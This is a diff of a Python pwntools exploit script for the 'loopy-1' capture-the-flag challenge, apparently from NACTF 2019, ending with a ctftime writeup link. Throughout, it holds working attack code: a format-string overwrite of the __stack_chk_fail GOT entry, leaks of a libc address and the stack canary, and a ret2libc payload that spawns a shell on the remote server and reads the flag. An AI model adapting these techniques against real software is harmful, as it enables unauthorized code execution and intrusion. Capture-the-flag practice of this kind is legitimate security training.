@@ -5,8 +5,13 @@ from pwn import *
 
 libc = ELF('./libc.so.6')
 e = ELF('./loopy-1')
-p = process('./loopy-1')
-context.terminal = ['tmux', 'new-window']
+#p = process('./loopy-1')
+p = remote('shell.2019.nactf.com', 31732)
+
+# gdb.attach(p, '''
+# break *0x08049203
+# ''')
+
 
 #get addr
 bin_off = 0x17eaaa
@@ -14,24 +19,27 @@ stk = e.got['__stack_chk_fail']
 vuln = e.symbols['vuln']
 main = e.symbols['main']
 fwrite_got = e.got['fwrite']
+offset = 0x1dad80
 
 log.info('__stack_chk_fail: '+hex(stk))
 log.info('vuln: '+hex(vuln))
+log.info('fwrite: '+hex(fwrite_got))
 
 #write vuln to stk check
 payload = ''
 payload+= fmtstr_payload(7, {stk:main})
-payload+= 'A'*68
-p.sendline(payload)
+p.sendlineafter('>', payload + 'A'*(70-len(payload)))
 
 #leak addr
 payload = ''
-payload+= p32(fwrite_got)
-payload+= '%7$s'
-p.sendlineafter('>', payload+'A'*(72-len(payload)))
+payload+= '%3$x'
+payload+= 'A'*70
+p.sendline(payload)
 p.recvuntil('You typed: ')
-p.recv(4)
-libc_base = u32(p.recv(4))-libc.symbols['fwrite']
+p.recvuntil('You typed: ')
+leak = int(p.recv(8), 16)
+libc_base = leak - offset
+log.info('leak: '+hex(leak))
 log.info('libc_base: '+hex(libc_base))
 
 #get system and binsh
@@ -42,22 +50,22 @@ log.info('/bin/sh :'+hex(binsh))
 
 #leak canary
 payload = ''
-payload+= '%23$x'
-p.sendlineafter('>', payload+'A'*(72-len(payload)))
+payload+= '%31$x'
+payload+= 'A'*70
+p.recv()
+p.sendline(payload)
 p.recvuntil('You typed: ')
-p.recv(4)
-canary = u32(p.recv(4))
-log.info('Canary: '+hex(canary))
+canary = int(p.recv(8), 16)
+log.info('Canary: '+ hex(canary))
 
 #bustamove
 payload = ''
 payload+= 'A'*64
 payload+= p32(canary)
-payload+= 'A'*12
+payload+= "A"*12
 payload+= p32(system)
-payload+= 'BBBBBBB'
+payload+= 'BBBB'
 payload+= p32(binsh)
 p.sendlineafter('>', payload)
+p.sendline('cat flag.txt')
 p.interactive()
-
-https://ctftime.org/writeup/16622
